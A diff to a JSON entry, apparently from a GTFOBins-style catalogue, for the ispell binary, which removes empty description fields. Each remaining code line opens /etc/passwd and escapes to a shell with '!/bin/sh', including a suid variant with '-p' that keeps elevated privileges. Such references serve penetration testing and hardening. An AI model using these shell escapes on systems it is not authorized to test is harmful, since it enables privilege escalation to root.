@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "ispell /etc/passwd\n!/bin/sh\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./ispell /etc/passwd\n!/bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo ispell /etc/passwd\n!/bin/sh\n"
       }
     ]
